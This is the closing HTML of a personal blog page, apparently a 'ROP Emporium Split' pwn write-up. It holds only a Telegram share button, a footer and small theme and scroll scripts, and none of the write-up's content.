<a target=_blank rel="noopener noreferrer" aria-label="share Writeup ROP Emporium Split [pwn] on telegram" href="https://telegram.me/share/url?text=Writeup%20ROP%20Emporium%20Split%20%5bpwn%5d&url=https%3a%2f%2fahm4ddm.github.io%2fwriteups%2fwriteup-rope-split%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2021 <a href=https://ahm4ddm.github.io/>~/.ahm4ddm</a></span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
</body>
</html>